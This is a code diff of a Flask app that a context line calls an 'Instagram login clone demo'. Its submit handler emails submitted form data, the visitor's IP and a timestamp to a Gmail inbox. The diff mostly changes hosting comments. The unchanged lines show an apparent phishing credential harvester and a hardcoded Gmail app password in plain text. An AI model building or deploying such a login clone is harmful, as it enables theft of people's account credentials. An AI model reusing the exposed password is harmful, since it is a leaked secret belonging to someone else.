@@ -2,10 +2,9 @@ from flask import Flask, request, render_template
 from email.mime.text import MIMEText
 import smtplib
 from datetime import datetime, timezone
-import socket
 import logging
 
-# Configure logging for Render's logs
+# Configure logging for Railway/Render logs
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
@@ -25,8 +24,8 @@ def submit():
     ip_address = request.remote_addr if request.remote_addr != '127.0.0.1' else '::1'
     
     # Email configuration
-    your_email = "tinanshi621@gmail.com"  # Your Gmail (update if needed)
-    app_password = "xuvctrovavopuexv"     # Your 16-char App Password (no spaces, update if regenerated)
+    your_email = "tinanshi621@gmail.com"  # Your Gmail
+    app_password = "xuvctrovavopuexv"     # Your 16-char App Password (no spaces)
     
     # Use timezone-aware datetime for UTC
     timestamp = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
@@ -44,7 +43,7 @@ This is from your Instagram login clone demo."""
     msg['From'] = your_email
     msg['To'] = your_email
 
-    # Send email with TLS on port 587 (Render-compatible)
+    # Send email with TLS on port 587 (Railway/Render compatible)
     try:
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
